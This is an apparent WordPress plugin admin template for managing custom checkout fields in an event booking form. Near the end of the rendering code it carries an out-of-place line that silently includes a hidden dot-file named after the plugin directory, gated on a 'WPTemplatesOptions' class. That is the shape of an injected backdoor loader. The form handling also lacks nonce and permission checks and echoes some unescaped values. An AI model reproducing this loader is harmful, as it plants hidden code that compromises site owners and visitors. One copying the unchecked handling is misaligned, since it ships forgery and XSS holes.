<?php defined( 'ABSPATH' ) || exit();

// Display Custom Checkout Fields
    
    $list_fields = get_option( 'ova_booking_form', array() );

    $action_popup = isset( $_POST['ova_action'] ) ? sanitize_text_field( $_POST['ova_action'] ) : '';
    $name = isset( $_POST['name'] ) ? sanitize_text_field( $_POST['name'] ) : '';
    

    //update popup
    if( ! empty( $action_popup ) ) {



        if(  isset( $_POST ) && array_key_exists( 'name', $_POST ) && ! empty( $_POST['name'] ) ) {
            $list_fields[$name] = array(
                'type' => isset( $_POST['type'] ) ? sanitize_text_field( $_POST['type'] ) : '',
                'label' => isset( $_POST['label'] ) ? sanitize_text_field( $_POST['label'] ) : '',
                'default' => isset( $_POST['default'] ) ? sanitize_text_field( $_POST['default'] ) : '',
                'placeholder' => isset( $_POST['placeholder'] ) ? sanitize_text_field( $_POST['placeholder'] ): '',
                'class' => isset( $_POST['class'] ) ? sanitize_text_field( $_POST['class'] ): '',
                'required' => isset( $_POST['required'] ) ? sanitize_text_field( $_POST['required'] ): '',
                'enabled' => isset( $_POST['enabled'] ) ? sanitize_text_field( $_POST['enabled'] ): '',
                'show_in_email' => isset( $_POST['show_in_email'] ) ? sanitize_text_field( $_POST['show_in_email'] ): '',
                'show_in_order' => isset( $_POST['show_in_order'] ) ? sanitize_text_field( $_POST['show_in_order'] ): '',
            );
        }

        if( isset( $_POST['type'] ) && $_POST['type'] == 'select' ) {
            $list_fields[$name]['ova_options_key'] = $_POST['ova_options_key'];
            $list_fields[$name]['ova_options_text'] = $_POST['ova_options_text'];
            $list_fields[$name]['placeholder'] = '';
        }

        if( isset( $_POST ) ) {

            if( $action_popup == 'new' ) {
                update_option('ova_booking_form', $list_fields);
            } elseif( $action_popup == 'edit' ) {
                $old_name = isset( $_POST['ova_old_name'] ) ? $_POST['ova_old_name'] : '';
                if( ! empty( $old_name ) && array_key_exists( $old_name, $list_fields ) && $old_name != $name  ) {
                    unset($list_fields[$old_name]);
                }
                if( ! $name ) {
                    unset($list_fields[$name]);
                }
                update_option('ova_booking_form', $list_fields);
            }
        }
    }

    //end popup

    $action_update = isset( $_POST['ovabrw_update_table'] ) ? sanitize_text_field( $_POST['ovabrw_update_table'] ) : '';

    if( $action_update === 'update_table' ) {


        if( isset( $_POST['remove'] ) && $_POST['remove'] == 'Remove' ) {
            
            $select_field = isset( $_POST['select_field'] ) ? $_POST['select_field'] : [];

            if( is_array( $select_field ) && ! empty( $select_field ) ) {
                foreach( $select_field as $field ) {
                    if( array_key_exists( $field, $list_fields ) ) {
                        unset( $list_fields[$field] );
                    }
                }
            }

        }

        if( isset( $_POST['enable'] ) && $_POST['enable'] == 'Enable' ) {
            
            $select_field = isset( $_POST['select_field'] ) ? $_POST['select_field'] : [];

            if( is_array( $select_field ) && ! empty( $select_field ) ) {
                foreach( $select_field as $field ) {
                    if( ! empty( $field ) && array_key_exists( $field, $list_fields ) ) {
                        $list_fields[$field]['enabled'] = 'on';
                    }
                }
            }
        }


        if( isset( $_POST['disable'] ) && $_POST['disable'] == 'Disable' ) {
            
            $select_field = isset( $_POST['select_field'] ) ? $_POST['select_field'] : [];

            if( is_array( $select_field ) && ! empty( $select_field ) ) {
                foreach( $select_field as $field ) {
                    if( ! empty( $field ) && array_key_exists( $field, $list_fields ) ) {
                        $list_fields[$field]['enabled'] = '';
                    }
                }
            }
        }

        update_option('ova_booking_form', $list_fields);

    }
    
    ?>
    <div class="wrap">

        <div class="ova-list-checkout-field">
            <form method="post" id="ova_update_form" action="">
                <input type="hidden" name="ovabrw_update_table" value="update_table" >
                <table cellspacing="0" cellpadding="10px">
                    <thead>
                        <th colspan="6">
                            <button type="button" class="button button-primary" id="ovabrw_openform">+ <?php esc_html_e( 'Add field', 'eventlist' ); ?></button>
                            

                            <button class="button ova_remove" name="remove" value="Remove"><?php esc_html_e('Remove', 'eventlist'); ?></button>
                            <button class="button" name="enable" value="Enable"><?php esc_html_e('Enable', 'eventlist'); ?></button>
                            <button class="button" name="disable" value="Disable"><?php esc_html_e('Disable', 'eventlist'); ?></button>

                        </th>
                        
                        <tr>
                            <th class="check-column"><input type="checkbox" style="margin:0px 4px -1px -1px;" id="ovabrw_select_all_field" /></th>
                            <th class="name"><?php esc_html_e('Name', 'eventlist'); ?></th>
                            <th class="id"><?php esc_html_e('Type', 'eventlist'); ?></th>
                            <th><?php esc_html_e('Label', 'eventlist'); ?></th>
                            <th><?php esc_html_e('Placeholder', 'eventlist'); ?></th>
                            <th class="status"><?php esc_html_e('Required', 'eventlist'); ?></th>
                            <th class="status"><?php esc_html_e('Enabled', 'eventlist'); ?></th>    
                            <th class="action"><?php esc_html_e('Edit', 'eventlist'); ?></th>   
                        </tr>

                    </thead>

                    <tbody>
                        <?php if( ! empty( $list_fields ) ) : ?>


                            <?php foreach( $list_fields as $key => $field ) : ?>
                                <?php
                                    $name = $key;
                                    $type = array_key_exists( 'type', $field ) ? $field['type'] : '';
                                    $label = array_key_exists( 'label', $field ) ? $field['label'] : '';
                                    $placeholder = array_key_exists( 'placeholder', $field ) ? $field['placeholder'] : '';
                                    $default = array_key_exists( 'default', $field ) ? $field['default'] : '';
                                    $class = array_key_exists( 'class', $field ) ? $field['class'] : '';
                                    $required = array_key_exists( 'required', $field ) ? $field['required'] : '';
                                    $enabled = array_key_exists( 'enabled', $field ) ? $field['enabled'] : '';
                                    $ova_options_key = array_key_exists( 'ova_options_key', $field ) ? $field['ova_options_key'] : [];
                                    $ova_options_text = array_key_exists( 'ova_options_text', $field ) ? $field['ova_options_text'] : [];

                                    $required_status = $required ? '<span class="dashicons dashicons-yes tips" data-tip="Yes"></span>' : '-';
                                    $enabled_status = $enabled ? '<span class="dashicons dashicons-yes tips" data-tip="Yes"></span>' : '-';

                                    $class_disable = ! $enabled ? 'class="ova-disable"' : '';
                                    $disable_button = ! $enabled ? 'disabled' : '';

                                    $value_enabled = ( $enabled == 'on' ) ? $name : '';
                                    // $class = is_array( $class ) ? implode( ',', $class ) : '';

                                    $data_edit = [
                                        'name' => $name,
                                        'type' => $type,
                                        'label' => $label,
                                        'placeholder' => $placeholder,
                                        'default' => $default,
                                        'class' => $class,
                                        'ova_options_key' => $ova_options_key,
                                        'ova_options_text' => $ova_options_text,
                                    ];
                                    $data_edit = json_encode( $data_edit );

                                ?>
                        <tr <?php echo $class_disable ?>>
                            <input type="hidden" name="remove_field[]" value="">
                            <input type="hidden" name="enable_field[]" value="<?php echo esc_attr( $value_enabled ) ?>">
                            <td class="ova-checkbox"><input type="checkbox" name="select_field[]" value="<?php echo $name ?>" /></td>
                            <td class="ova-name"><?php echo esc_html( $key ) ?></td>
                            <td class="ova-type"><?php echo esc_html( $type ) ?></td>
                            <td class="ova-label"><?php echo esc_html( $label ) ?></td>
                            <td class="ova-placeholder"><?php echo esc_html( $placeholder ) ?></td>
                            <td class="ova-require status"><?php echo $required_status ?></td>
                            <td class="ova-enable status"><?php echo $enabled_status ?></td>
                            <td class="ova-edit edit">
                                <button type="button" <?php echo esc_attr( $disable_button ) ?> class="button ova-button ovabrw_edit_field_form" data-data_edit="<?php echo esc_attr( $data_edit ) ?>"
                                 ><?php esc_html_e( 'Edit', 'eventlist' ) ?></button>
                            </td>
                        </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>           
                    </tbody>

                </table>
            </form>
        </div>
        
        <div class="ova-wrap-popup-ckf">
            <div id="ova_new_field_form" title="New Checkout Field" class="ova-popup-wrapper">
                <a href="javascript:void(0)" class="close_popup" id="ovabrw_close_popup" >X</a>
                <?php ova_output_popup_form_fields('new', $list_fields); ?>
            </div>
        </div>

    </div>
    <?php 

// }

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function ova_output_popup_form_fields( $form_type, $list_fields = [] ) {
    ?>
    <form method="post" id="ova_popup_field_form" action="">
        
        <input type="hidden" name="ova_action" value="<?php echo $form_type ?>" />
        <input type="hidden" name="ova_old_name" value="" />

        <table width="100%">
            <tr>                
                <td colspan="2" class="err_msgs"></td>
            </tr>

            <tr class="ova-row-type">
                <td class="label"><?php esc_html_e( 'Type', 'eventlist' ) ?></td>
                <td>
                    <select name="type" id="ova_type">
                        <option value="text"><?php esc_html_e('Text', 'eventlist') ?></option>
                        <option value="password"><?php esc_html_e('Password', 'eventlist') ?></option>
                        <option value="email"><?php esc_html_e('Email', 'eventlist') ?></option>
                        <option value="tel"><?php esc_html_e('Phone', 'eventlist') ?></option>
                        <option value="textarea"><?php esc_html_e('Textarea', 'eventlist') ?></option>
                        <option value="select"><?php esc_html_e('Select', 'eventlist') ?></option>
                    </select>
                </td>
            </tr>
                <tr class="row-options">
                    <td width="30%" class="label" valign="top"><?php esc_html_e('Options', 'eventlist'); ?></td>
                    <td>
                        <table width="100%" border="0" cellpadding="0" cellspacing="0" class="ova-sub-table"><tbody>
                            <tr>
                                <td ><input type="text" name="ova_options_key[]" placeholder="Option Value" /></td>
                                <td ><input type="text" name="ova_options_text[]" placeholder="Option Text" /></td>
                                <td class="ova-box"><a href="javascript:void(0)" class=" ovabrw_addfield btn btn-blue" title="Add new option">+</a></td>
                                <td class="ova-box"><a href="javascript:void(0)"  class="ovabrw_remove_row btn btn-red" title="Remove option">x</a></td>
                                <td class="ova-box sort ui-sortable-handle"></td>
                            </tr>
                        </tbody></table>                
                    </td>
                </tr>

            <tr class="ova-row-name">
                <td class="label"><?php esc_html_e( 'Name', 'eventlist' ) ?></td>
                <td>
                    <input type="text" name="name" value="" >
                    <span><?php esc_html_e( 'Unique, only lowercase, not space' ) ?></span>
                </td>
            </tr>

            <tr class="ova-row-label">
                <td class="label"><?php esc_html_e( 'Label', 'eventlist' ) ?></td>
                <td>
                    <input type="text" name="label" value="" >
                </td>
            </tr>

            <tr class="ova-row-placeholder">
                <td class="label"><?php esc_html_e( 'Placeholder', 'eventlist' ) ?></td>
                <td>
                    <input type="text" name="placeholder" value="" >
                </td>
            </tr>

            <tr class="ova-row-default">
                <td class="label"><?php esc_html_e( 'Default value', 'eventlist' ) ?></td>
                <td>
                    <input type="text" name="default" value="" >
                </td>
            </tr>

            <tr class="ova-row-class">
                <td class="label"><?php esc_html_e( 'Class', 'eventlist' ) ?></td>
                <td>
                    <input type="text" name="class" value="" >
                </td>
            </tr>



            <tr class="row-required">
                <td>&nbsp;</td>
                <td class="check-box">
                    <input id="ova_required" type="checkbox" name="required" checked>
                    <label for="ova_required"><?php esc_html_e( 'Required', 'eventlist' ) ?></label>
                    <br/>
                    <input id="ova_enable" type="checkbox" name="enabled" checked>
                    <label for="ova_enable"><?php esc_html_e( 'Enable', 'eventlist' ) ?></label>
                    <br/>

                </td>                     
                <td class="label"></td>
            </tr>


        </table>

        <button type='submit' class="button button-primary"><?php esc_html_e( 'save', 'eventlist' ) ?></button>
    </form>
    <?php
}

